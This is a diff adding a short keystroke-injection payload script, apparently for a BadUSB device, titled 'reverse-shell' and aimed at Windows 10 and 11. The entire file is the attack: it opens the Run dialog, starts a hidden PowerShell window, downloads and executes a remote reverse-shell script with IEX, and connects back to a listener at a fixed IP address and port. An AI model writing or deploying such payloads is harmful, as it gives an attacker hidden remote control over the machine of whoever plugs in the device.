@@ -1,0 +1,14 @@
+REM Author: WORMUS
+REM target: windows 10 / 11
+REM title : reverse-shell 
+REM version : 1.0
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 500
+
+STRING powershell.exe -WindowStyle Hidden -Command "IEX (IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.1.173 87"
+ENTER
